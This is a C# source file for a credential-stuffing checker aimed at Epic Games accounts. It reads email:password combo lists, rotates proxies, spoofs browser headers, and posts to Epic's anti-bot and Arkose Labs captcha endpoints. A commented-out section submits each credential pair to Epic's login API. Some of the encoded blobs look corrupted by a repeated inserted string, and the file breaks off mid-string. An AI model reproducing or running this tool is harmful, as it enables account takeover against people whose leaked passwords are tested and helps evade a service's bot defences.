using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check28
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Checking32.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						if (Checking32.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								req.IgnoreProtocolErrors = true;
								req.KeepAlive = true;
								req.EnableEncodingContent = true;
								req.Proxy = Checking32.RandomProxies();

								req.EnableEncodingContent = true;
								req.ConnectTimeout = Program.config.timeout;
								req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								req.AddHeader("Accept", "*/*");
								req.AddHeader("accept", "application/json, text/plain, */*");
								req.AddHeader("accept-encoding", "gzip, deflate, br");
								req.AddHeader("accept-language", "en-GB,en;q=0.9");
								req.AddHeader("origin", "https://talon-website-prod.ak.epicgames.com");
								req.AddHeader("referer", "https://talon-website-prod.ak.epicgames.com/");
								req.AddHeader("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36");
								string am = req.Post("https://talon-service-prod.ak.epicgames.com/v1/init", "{\"flow_id\":\"login_prod\",\"v\":1,\"xal\":\"7ceb0f401c901c58c76713967a716388603e01628196c81adb0b08aaadb174bd084402d54308852548c9231e27c022793c3dd78ec01bcd1d49edf2ec33934b05509a185edf4a0899604a37d7307c093edc87c24f964d4ff0a4b230eb450b16981a5fda70148c2c146ecf66241c618a96c80ca34810acaef444a108451e92174dd23707d42c40749b7b2a097980c6d0148c0b09b0a5a658a80e4c1c835b10955815826742798c3d78463dcf9ca547994d13b4b3f4499d491842d9491197421396381a2ecd6a7b5c24cff5825e9b4c2ba6a29f6ebd461c41c05719813552b3467a58a13e6d046484d1d269924a17ace9f444a11b461f925612803b4ad63a1c2ddd3c7c5c3ccfe79348965b15ecf5e730e75a1f52b82978982249d63e0026d5277b463edb80d206b24d15b7a9bb69e91c5d1d850b4fd96153da220c658173390e629dd9d014d57e15adf3e625e54b4513991e5fd6721fda340c739f3f0b3a2fc3969e4f994e09a2a7b174eb537250910b07f14758a5220c7d8c60291f6c9dd1ad4d98471fb6b2a662a70a5050cd4f0695711f8e674d70b27f2805629dcdd014cf055eb3b2bb63bc0a5d50cd5b6dd27611972c02379d60220c788cc0ad5d824b5ef9e2e637f95a1943c74e089b370c9d604a7a9f30774a4a80db9542920935ada3fa25e54b5f17991d45c54a098d6c0c2fcf30614a608eccad5a985c1fab9fa468a0075d01d5431a9b37199761457c884d28066c8dd8974ad51308b1b5b12beb195b1d871c58c36c2594675d61cf28164a7b8ada9641857a09a1e2f825b91b4616821a5ee46018da220c63887c29077fcd98d043965128acb5b76f9906401c830a089b370f8b6b5c548e66241e6c9bdd9d40d5055ea7af9a68bd3d5b139412089b371d9d61427a8e733901628196de0c944612ada5b773a0064750db5b5adb601d91605d37c1302001608ae08b5e925a5eefe2a362ab024006a31c47c77a08997c5746997d3f096a8a96de0c804c1ea8a9a057ac1b5a1b840d4fd961298c615c748a776f442f87d5804a80480ea683bb69aa1c5b00921749ce3756da6d417a867b282d638ed69e4b930b50e1a1a4778a064d17b91847d23756da6f5e65a373200d2fc396935e877f19b1b3bd68a74b055087154bc373158a630c39cf623f07699ad7860cdb0b09b0a5a646ae0c4706d55508db74149f7b4f728830614a618eda955b964e19b0e2f825a607651b991c089b371d9d7a6c749966281a74cd98d049925d3ba2adb177a80d5a50db5b40d6631bbd604f778177294a21cdc79740936b19a2a3bb69eb450b049e1b58d6611fda220c668e7a280c7883dd9c49d5055ebbb2f62beb044c169e1869d6651b9a67427c997b281b2fc396824b854415b0b3bd68a71a0b5ed51545d47e09da220c628c792824628cdfd002d55c0fa1e2f825a40c4d1b962a4fc4661397600c39cf7121017d8ddb935c930b50e1a3a662ad0c47069e1846c43756da654b6c8f7d2c1a69cd98d043924d15a284b171a00a4c01d55508c461158a6f4970cf3e6f1b689dc29b4d927e13b1abb175eb450b16920f43d470379d6341679430614a7d9dd1814b995d1db7a9bb69eb450b109b0c4fc37a158c660c39cf60280f649cc0975ca75b13b7afb768a521481c93154fc53756da7b40678875241b798ac6a25c985d13a0afb84fa8074d1e920b089b371d9d7a677b9e662c04618ad0a04b9b4808a6a49577b91a0b5ed51e4fc340099d7c6370897b2c4a21cdc6975f824c0fb78d9d4380284a11920a599539588a6b5f6088613925688bdd936592502fbab3a062a4284a11920a599539588f6b4c7e84660a0d79bac7975cba4c18aaa1f65ab4450b05921b75d07958c2750c768c7c3b097eb0d29b40904c0eb3b2bd69bd4b1309d5154fd9720e902c1426df26755a21cdda8743a84a13afafa674eb531d47c64f0695781ecd2c1437d8272e0a6f89d5c24cce1d1ffaf2b03faa5d1c4ace40198e7118c06c1671df746f442f9bd88146d5135ef2f491358f5b6b30b24b1a81513bce3c1f56d8220c513ed786c41ab31d48f78491418d2d1836ce3c1b862d39bd391623ae57095149de84ca68ce1f4f86f290428d2d6b43c44908ca3958886f5c748077390d7f9c96c855d55b19ada4b175ac1b0b48d53864f0593fd8266043a45604292da8d1b441854a19e387805fe9581f44c75979e2453faa2e6a7c9f772e1c3eab85c30e815a23f69fe427b91a7647a849039539588e6b407182606f522fa8db9d499b4c5c8aaeb729eb14545ed50e43d971158f2c146ecf7e220b6c9bdd9d40d51307e1afa66eae004750cd5b42c3610a8b34013a9973210763c2c3974c844008a6eda475a60d07139c574fc77c199f6f43709e3c2e0760cd98d05e965d14ada1b962eb530b5d94114bdb791f96694b37903e6f00649cc09d5c8e0b46b8e2b862a70e5d1ad54319ca39588b6d5c70887c6f5276cdd5844f9e4523aba5bd60a11d0b48c6491e87395899784f7c814d3a01699bdcd014c6104ef3ecf666bf08401ea80d45c73740c8220c7d887b2a0079cd8ec31ecf1950e1b7bd63bd010b48c640188739589b61427a9f4d290d7d9bdcd014c51d01efe2a462bb0f46009a1844d47058c2750c78887f221a74cd8e890c9d5a23aba5b577961a4008922646de78138c2c1427dc257f5e39d680c51cdb0b08acb4b56b96035a2d9f1c4bc74a0991744b37d7267d5839d682c219db0b09b0a5b058a31a761a92185ae86613826b0c2fdf227e5d3edf8dc7538a055ea7a5a26eaa0c76029e014fdb4a08997a477acf287c442f82d19647967618a6b6bd64ac1a0b48ac0208d3700c916d4b4a84766f522fcd98d0459e4718e1faf666bc0d401d9e175ac26158d42c496782673d37648b96c80cc1184ea1f0e262fc5f1b45c54d1cd671499c6a4b218f217f5c6bd7d1c21ac14d4cf0f5e263ac0f4d4ace401d81734aca3f1f2d892a740b348dd6ca1ac54818f3e2a92bb24b4d17811049d24a139c2c1437cf3e6f036481d0d014d54809a7a9bb68bc1d5907835b06957208977b5e4a84766f522fd985c04cc71f19f6f6e630fb5d1f13934a4ed3704e9a3d1c218b2a285839d9d0c21dc21f18a6a6b03ff0501e449149188624429c361776d4702f5039ddd5961ed55421efe2b066bb02761f981d4f952f0e8a7b4b68c1302909798a96c855d55d15aea5ae68a70c761d911f59d26158c2231825c1302b077f82d5860ccd525ea0a1b862a70d4800d54308d0671f9f615c6ccf3e6f0c6c9696c80cc50418aaa7bd73eb450b1e981a4bdb7058c22c4867cf3e6f056281c09a0ccd0b4eeea4bd60a01d0b5ed5175fda771f8a674072b261341b798ad9d014d5451db7aef62beb1d401f922650d87b1fda340c509860221868c0e4935c9e5a5eefe2ad62a81b0b48d5175fda7008916d0c68906f\",\"ewa\":\"b\",\"kid\":\"sk29dsv\"}", "application/json;charset=UTF-8").ToString();

								req.ClearAllHeaders();

								req.EnableEncodingContent = true;
								req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
								req.AddHeader("Accept", "*/*");
								string take = req.Post("https://talon-service-v4-prod.ak.epicgames.com/v1/init/execute", "{\"session\":" + am + ",\"v\":1,\"xal\":\"7ceb0f401c901c58c76713967a716388603e01628196c81adb0b08aaadb174bd084402d54308852548c9231e27c0227e3c3cd78ec01acd194fedf5e635934b05509a185edf4a0899604a37d7307c516b8d86c24bce4f18f4a4ec37eb450b16981a5fda70148c2c146ecf66241c618a96c80ca34810acaef444a108451e92174dd23707d42c40749b7b2a097980c6d0148c0b09b0a5a658a80e4c1c835b10955815826742798c3d78463dcf9ca547994d13b4b3f4499d491842d9491197421396381a2ecd6a7b5c24cff5825e9b4c2ba6a29f6ebd461c41c05719813552b3467a58a13e6d046484d1d269924a17ace9f444a11b461f925612803b4ad63a1c2ddd3c7c5c3ccfe79348965b15ecf5e730e75a1f52b82978982249d63e0026d5277b463edb80d206b24d15b7a9bb69e91c5d1d850b4fd96153da220c658173390e629dd9d014d57e15adf3e625e54b4513991e5fd6721fda340c739f3f0b3a2fc3969e4f994e09a2a7b174eb537250910b07f14758a5220c7d8c60291f6c9dd1ad4d98471fb6b2a662a70a5050cd4f0695711f8e674d70b27f2805629dcdd014cf055eb3b2bb63bc0a5d50cd5b6dd27611972c02379d60220c788cc0ad5d824b5ef9e2e637f95a1943c74e089b370c9d604a7a9f30774a4a80db9542920935ada3fa25e54b5f17991d45c54a098d6c0c2fcf30614a608eccad5a985c1fab9fa468a0075d01d5431a9b37199761457c884d28066c8dd8974ad51308b1b5b12beb195b1d871c58c36c2594675d61cf28164a7b8ada9641857a09a1e2f825b91b4616821a5ee46018da220c63887c29077fcd98d043965128acb5b76f9906401c830a089b370f8b6b5c548e66241e6c9bdd9d40d5055ea7af9a68bd3d5b139412089b371d9d61427a8e733901628196de0c944612ada5b773a0064750db5b5adb601d91605d37c1302001608ae08b5e925a5eefe2a362ab024006a31c47c77a08997c5746997d3f096a8a96de0c804c1ea8a9a057ac1b5a1b840d4fd961298c615c748a776f442f87d5804a80480ea683bb69aa1c5b00921749ce3756da6d417a867b282d638ed69e4b930b50e1a1a4778a064d17b91847d23756da6f5e65a373200d2fc396935e877f19b1b3bd68a74b055087154bc373158a630c39cf623f07699ad7860cdb0b09b0a5a646ae0c4706d55508db74149f7b4f728830614a618eda955b964e19b0e2f825a607651b991c089b371d9d7a6c749966281a74cd98d049925d3ba2adb177a80d5a50db5b40d6631bbd604f778177294a21cdc79740936b19a2a3bb69eb450b049e1b58d6611fda220c668e7a280c7883dd9c49d5055ebbb2f62beb044c169e1869d6651b9a67427c997b281b2fc396824b854415b0b3bd68a71a0b5ed51545d47e09da220c628c792824628cdfd002d55c0fa1e2f825a40c4d1b962a4fc4661397600c39cf7121017d8ddb935c930b50e1a3a662ad0c47069e1846c43756da654b6c8f7d2c1a69cd98d043924d15a284b171a00a4c01d55508c461158a6f4970cf3e6f1b689dc29b4d927e13b1abb175eb450b16920f43d470379d6341679430614a7d9dd1814b995d1db7a9bb69eb450b109b0c4fc37a158c660c39cf60280f649cc0975ca75b13b7afb768a521481c93154fc53756da7b40678875241b798ac6a25c985d13a0afb84fa8074d1e920b089b371d9d7a677b9e662c04618ad0a04b9b4808a6a49577b91a0b5ed51e4fc340099d7c6370897b2c4a21cdc6975f824c0fb78d9d4380284a11920a599539588a6b5f6088613925688bdd936592502fbab3a062a4284a11920a599539588f6b4c7e84660a0d79bac7975cba4c18aaa1f65ab4450b05921b75d07958c2750c768c7c3b097eb0d29b40904c0eb3b2bd69bd4b1309d5154fd9720e902c1426df26755a21cdda8743a84a13afafa674eb531d47c64f0695781ecd2c1437d8272e0a6f89d5c24cce1d1ffaf2b03faa5d1c4ace40198e7118c06c1671df746f442f9bd88146d5135ef2f491358f5b6b30b24b1a81513bce3c1f56d8220c513ed786c41ab31d48f78491418d2d1836ce3c1b862d39bd391623ae57095149de84ca68ce1f4f86f290428d2d6b43c44908ca3958886f5c748077390d7f9c96c855d55b19ada4b175ac1b0b48d53864f0593fd8266043a45604292da8d1b441854a19e387805fe9581f44c75979e2453faa2e6a7c9f772e1c3eab85c30e815a23f69fe427b91a7647a849039539588e6b407182606f522fa8db9d499b4c5c8aaeb729eb14545ed50e43d971158f2c146ecf7e220b6c9bdd9d40d51307e1afa66eae004750cd5b42c3610a8b34013a9973210763c2c3974c844008a6eda475a60d07139c574fc77c199f6f43709e3c2e0760cd98d05e965d14ada1b962eb530b5d94114bdb791f96694b37903e6f00649cc09d5c8e0b46b8e2b862a70e5d1ad54319ca39588b6d5c70887c6f5276cdd5844f9e4523aba5bd60a11d0b48c6491e87395899784f7c814d3a01699bdcd014c6104ef3ecf666bf08401ea80d45c73740c8220c7d887b2a0079cd8ec31ecf1950e1b7bd63bd010b48c640188739589b61427a9f4d290d7d9bdcd014c51d01efe2a462bb0f46009a1844d47058c2750c78887f221a74cd8e890c9d5a23aba5b577961a4008922646de78138c2c1427dc257f5e39d680c51cdb0b08acb4b56b96035a2d9f1c4bc74a0991744b37d7267d5039db81c118db0b09b0a5b058a31a761a92185ae86613826b0c2fdf2574513ddc82ca538a055ea7a5a26eaa0c76029e014fdb4a08997a477acf287c442f82d19647967618a6b6bd64ac1a0b48ac0208d3700c916d4b4a84766f522fcd98d0459e4718e1faf666bc0d401d9e175ac26158d42c496782673d37648b96c80c961849f4f4e762ad594817c04a1f80271c9c3a1c71dc2a280e6cd9d0c419c01e48f2f1e130fb5f1b46ce1b48d1714fc03d4d208b24780d6bded6931dc54f4bf5e2a92bb24b4d17811049d24a139c2c1437cf3e6f036481d0d014d54809a7a9bb68bc1d5907835b06957208977b5e4a84766f522f8e85c719c31a19a7f0b562fe5a1c45c51f4e83271ec9364b738c24295e3ad883c61fc61c4bf1f6e633f00b4b14934c1284764f9e381b708b232f093eddd2c518d55421efe2b066bb02761f981d4f952f0e8a7b4b68c1302909798a96c855d55d15aea5ae68a70c761d911f59d26158c2231825c1302b077f82d5860ccd525ea0a1b862a70d4800d54308d0671f9f615c6ccf3e6f0c6c9696c80cc50418aaa7bd73eb450b1e981a4bdb7058c22c4867cf3e6f056281c09a0ccd0b4eeea4bd60a01d0b5ed5175fda771f8a674072b261341b798ad9d014d5451db7aef62beb1d401f922650d87b1fda340c509860221868c0e4935c9e5a5eefe2ad62a81b0b48d5175fda7008916d0c68906f\",\"ewa\":\"b\",\"kid\":\"sk29dsv\"}", "application/x-www-form-urlencode").ToString();
								JObject jobject = (JObject)JsonConvert.DeserializeObject(take);
								string blob = (string)jobject["blob"]; 

								req.ClearAllHeaders();
								req.EnableEncodingContent = true;
								req.AddHeader("accept", "*/*");
								req.AddHeader("accept-encoding", "gzip, deflate, br");
								req.AddHeader("accept-language", "fr-FR,fr;q=0.9");
								req.AddHeader("origin", "https://epic-games-api.arkoselabs.com");
								req.AddHeader("referer", "https://epic-games-api.arkoselabs.com/v2/37D033EB-6489-3763-2AE1-A228C04103F5/enforcement.27dd1d1925624ecf790c086477c971d2.html");
								req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.344 (Edition utorrent)");
								var lmfao = req.Post("https://epic-games-api.arkoselabs.com/fc/gt2/public_key/37D033EB-6489-3763-2AE1-A228C04103F5", $"bda=eyJjdCI6IkFPTG4zcWxpb2JoNkplYTVMeTR5R32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9IdzMyY2RWZDgrWm32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OUNkcCtvTXVqWWlkODE0VjRxd0JEWHZRSnc0UVluY2hnLy832n3AfVM36ugBczzdtwkxC6Rai1so3ajf9rTXpwM2tvNllhNzg4cVlWWktsbk32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9IUWxDQXZlL0VzVXpEQjJMcG5iZkZJWU9mejdhd2l5cWo0QTN2NTJGelpZN09vWVpveThyWVlqS0IxNzd6VDFpdk5nSnQ4cDVIVmFqTm5kYzg2LzN3YWs2OXl2SERFcEVYdGF5aTViRlpQQXZIbnhUQUUxZzNXbzJ2YXZjdnR32n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9ITzNrR0x5VGtFNlp0Z2xFZ32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9mVwTFVXWmZYb0hZZHBCVDZaWlBhTFVxak5KQkZBZWpMTXdha0ZLa2M0MGdCMThWTTl0RFY32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OcVJUSzZicEhFanJXYzQwaVhPbytsYW92dGRRajdmSkd5dEJ6N32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OFlYcEdlMTBqRDd3OTlPdTRLNnlUWnZ6UGpnRG9UeVE1Sml4Qi9MTnROancrb2ZVaUw0TS8xV0laR1R4dXYxbVg5L05CT1ZUeUdmOVN1OUx2TjdaNEVOZ3NXYjhwSW5oOUtISEw4ZGFPTXNUTVZZdzk1N20rWTdoOFpmeExIaFFvNWM0c32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9XdHNDE2Z32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9XZwSHBSRGNqNUFrV2p32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OaUUvVzhQSCtyOUtTS32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9zRWeFJaRUk3WDZZKzA1RFpEYmNjWU92dytOQTgyWXJKNlN5VURZUUNzSWF2SWtpUUpGczRuenJiUGtReHczRUlXeSsyUUZpQktadDJXRFFzc0pGYmFmNUc32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OSkFVQzN5V032n3AfVM36ugBczzdtwkxC6Rai1so3ajf9hUQytNbXFRNi9PdGtJdkt32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9XRlpzSVlMTXVQYlhpZkU4aEFJdStiSGE32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9RcDYwS2932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9SMjgxRFYrcWRjTDM4QXUwZ32n3AfVM36ugBczzdtwkxC6Rai1so3ajf90Vqcmxqc0ZnNGpMZXMvRmJHTHJaZzRZOGZQdDBKVnBlQ1hOMkd4ejNxZ2pUVUcvMkZIZVh2ejJRcDA3ODMwZUVtOUNTT0l32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9VdHBFVnFybVlESVRaemdRQWd6OXU32n3AfVM36ugBczzdtwkxC6Rai1so3ajf93em5JaW1nMWdaUXJOVHdITzM0UVJhS2sreS8rWUsxdkl5NHJhM2NnR0JCNUd32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OWhxM2xQSG80UXRaRmI32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9hQ01NbTVZQ2RjRC9Pdk5ld1RtM2dONEV4SHd1M1RHQ3hUL0c0S2JUOW9HcFE4TkZyY32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9kk4cjBDQS9xTUszM0dwOTFnUTM0bWEzVEMrcXJQUURtWEFCQzN32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OYytxVmxrR32n3AfVM36ugBczzdtwkxC6Rai1so3ajf92ttL32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OEo4U3NjZ3RydzhOaGlrbEFGZ32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9HhmQjczdGYybjMrYXVrTmV0THMyZXpvN32n3AfVM36ugBczzdtwkxC6Rai1so3ajf90s4Q2xEUnY0S245YW0wb2t3S1BtN2tIb32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OVVFZZ2ZkOWpzbEZ6RDBhZzFjOVNZcjdudDk0ODZSUzd0SElVT32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9OUVWQT09IiwiaXYiOiIwOThmNDE4YjBiY2Y1NTFhMDVkM2U3MGNiNmZiOTFlYSIsInMiOiIzMTE2Y2RkMzk5N2JkNzJhIn0=&public_key=37D033EB-6489-3763-2AE1-A228C04103F5&site=https://epic-games-api.arkoselabs.com&userbrowser=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.344 (Edition utorrent)&style_theme=default&rnd=0.3452032366394957&data[blob]={blob}", "application/x-www-form-urlencoded; charset=UTF-8");
								var lol = lmfao.ToString();
								Console.WriteLine(lol);
								//string token = WebUtility.UrlDecode(yey(lol, "{\"token\":\"", "\",\"challenge_url\":\""));
								//
								//var cap = getcode(am, token);
								//
								//req.ClearAllHeaders();
								//req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
								//req.AddHeader("Accept", "*/*");
								//req.Get("https://www.epicgames.com/id/api/csrf");
								//string ap = req.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["EPIC_SESSION_AP"].Value;
								//string srf = req.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["XSRF-TOKEN"].Value;
								//
								//req.ClearAllHeaders();
								//req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/10.19.9-14892359+++Portal+Release-Live UnrealEngine/4.23.0-14892359+++Portal+Release-Live Chrome/59.0.3071.15 Safari/537.36";
								//req.EnableEncodingContent = true;
								//req.AddHeader("Accept", "application/json, text/plain, */*");
								//req.AddHeader("POST", "/id/api/login HTTP/1.1");
								//req.AddHeader("Host", "www.epicgames.com");
								//req.AddHeader("Connection", "keep-alive");
								//req.AddHeader("Accept-Language", "en");
								//req.AddHeader("Content-Type", "application/json;charset=UTF-8");
								//req.AddHeader("Origin", "https://www.epicgames.com");
								//req.AddHeader("X-Epic-Event-Action", "login");
								//req.AddHeader("X-Epic-Event-Category", "login");
								//req.AddHeader("X-Epic-Strategy-Flags", "guardianKwsFlowEnabled=false;minorPreRegisterEnabled=false;guardianEmailVerifyEnabled=false");
								//req.AddHeader("X-Requested-With", "XMLHttpRequest");
								//req.AddHeader("X-XSRF-TOKEN", srf);
								//req.AddHeader("Referer", "https://www.epicgames.com/id/login/epic");
								//req.AddHeader("Accept-Encoding", "gzip, deflate");
								//req.AddHeader("Content-Length", "9826");
								//string sess = req.Post("https://www.epicgames.com/id/api/login", "{\"password\":\"dsqfdsqfsdfs\",\"rememberMe\":true,\"captcha\":\"" + cap + "\",\"email\":\"dsqfdfqsfq@dfqsf.dqsfqsdf\"}", "application/json, text/plain, */*").Cookies.GetCookies("https://www.epicgames.com/id/api/login")["EPIC_SESSION_REPUTATION"].Value;
								//
								//req.ClearAllHeaders();
								//req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
								//req.AddHeader("Accept", "*/*");
								//string srf2 = req.Get("https://www.epicgames.com/id/api/csrf").Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["XSRF-TOKEN"].Value;
								//
								//var content = "{\"password\":\"" + password + "\",\"rememberMe\":true,\"captcha\":\"" + cap + "\",\"email\":\"" + email + "\"}";
								//
								//req.ClearAllHeaders();
								//req.AddHeader("Cookie", $"EPIC_SESSION_REPUTATION={sess}");
								//req.AddHeader("POST", "/id/api/login HTTP/1.1");
								//req.AddHeader("Host", "www.epicgames.com");
								//req.AddHeader("Connection", "keep-alive");
								//req.AddHeader("Accept", "application/json, text/plain, */*");
								//req.AddHeader("Accept-Language", "en");
								//req.AddHeader("Origin", "https://www.epicgames.com");
								//req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/10.19.9-14892359+++Portal+Release-Live UnrealEngine/4.23.0-14892359+++Portal+Release-Live Chrome/59.0.3071.15 Safari/537.36");
								//req.AddHeader("X-Epic-Event-Action", "login");
								//req.AddHeader("X-Epic-Event-Category", "login");
								//req.AddHeader("X-Epic-Strategy-Flags", "guardianKwsFlowEnabled=false;minorPreRegisterEnabled=false;guardianEmailVerifyEnabled=false");
								//req.AddHeader("X-Requested-With", "XMLHttpRequest");
								//req.AddHeader("X-XSRF-TOKEN", srf2);
								//req.AddHeader("Referer", "https://www.epicgames.com/id/login/epic");
								//req.AddHeader("Accept-Encoding", "gzip, deflate");
								//req.AddHeader("Content-Length", "9826");
								//
								//string login = req.Post("https://www.epicgames.com/id/api/login", content, "application/json;charset=UTF-8").ToString();
								//Console.WriteLine(login);
							}
							catch (Exception e)
							{
								Console.WriteLine(e);
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking32.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking32.retry);
							}
						}
					}
				}
			}
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		// Generates a random number within a range.      
		public static string getcode(string lol, string tok)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes("{\"session_wrapper\":" + lol + ",\"plan_results\":{\"arkose\":{\"value\":\"" + tok + "\"}},\"v\":1,\"xal\":\"7ceb0f4032n3AfVM36ugBczzdtwkxC6Rai1so3ajf9db0b08aaadb32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9cd78ec032n3AfVM36ugBczzdtwkxC6Rai1so3ajf94a32n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9a32n3AfVM36ugBczzdtwkxC6Rai1so3ajf949b7b2a097980c6d032n3AfVM36ugBczzdtwkxC6Rai1so3ajf942798c32n3AfVM36ugBczzdtwkxC6Rai1so3ajf94932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9a6a29f6ebd4632n3AfVM36ugBczzdtwkxC6Rai1so3ajf969924a32n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf92978982249d632n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9d032n3AfVM36ugBczzdtwkxC6Rai1so3ajf90c732n3AfVM36ugBczzdtwkxC6Rai1so3ajf90932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9732n3AfVM36ugBczzdtwkxC6Rai1so3ajf97f2805629dcdd032n3AfVM36ugBczzdtwkxC6Rai1so3ajf90232n3AfVM36ugBczzdtwkxC6Rai1so3ajf9432n3AfVM36ugBczzdtwkxC6Rai1so3ajf920932n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9432n3AfVM36ugBczzdtwkxC6Rai1so3ajf98b32n3AfVM36ugBczzdtwkxC6Rai1so3ajf964a7b8ada96432n3AfVM36ugBczzdtwkxC6Rai1so3ajf9c632n3AfVM36ugBczzdtwkxC6Rai1so3ajf9c832n3AfVM36ugBczzdtwkxC6Rai1so3ajf955ea7af9a68bd32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9de0c944632n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9776f442f87d5804a80480ea6832n3AfVM36ugBczzdtwkxC6Rai1so3ajf9d632n3AfVM36ugBczzdtwkxC6Rai1so3ajf9756da6f5e65a32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9732n3AfVM36ugBczzdtwkxC6Rai1so3ajf909b0a5a646ae0c4706d55508db7432n3AfVM36ugBczzdtwkxC6Rai1so3ajf925a6076532n3AfVM36ugBczzdtwkxC6Rai1so3ajf9925d32n3AfVM36ugBczzdtwkxC6Rai1so3ajf977294a232n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf962beb044c32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9854432n3AfVM36ugBczzdtwkxC6Rai1so3ajf9792824628cdfd002d55c0fa32n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf96c432n3AfVM36ugBczzdtwkxC6Rai1so3ajf9b32n3AfVM36ugBczzdtwkxC6Rai1so3ajf989dc29b4d927e32n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf90c4fc32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9fb768a5232n3AfVM36ugBczzdtwkxC6Rai1so3ajf925c985d32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9662c04632n3AfVM36ugBczzdtwkxC6Rai1so3ajf90099d7c632n3AfVM36ugBczzdtwkxC6Rai1so3ajf9a32n3AfVM36ugBczzdtwkxC6Rai1so3ajf992502fbab32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9d79bac7975cba4c32n3AfVM36ugBczzdtwkxC6Rai1so3ajf97c32n3AfVM36ugBczzdtwkxC6Rai1so3ajf94fd9720e902c32n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf94cce32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9df746f442f9bd8832n3AfVM36ugB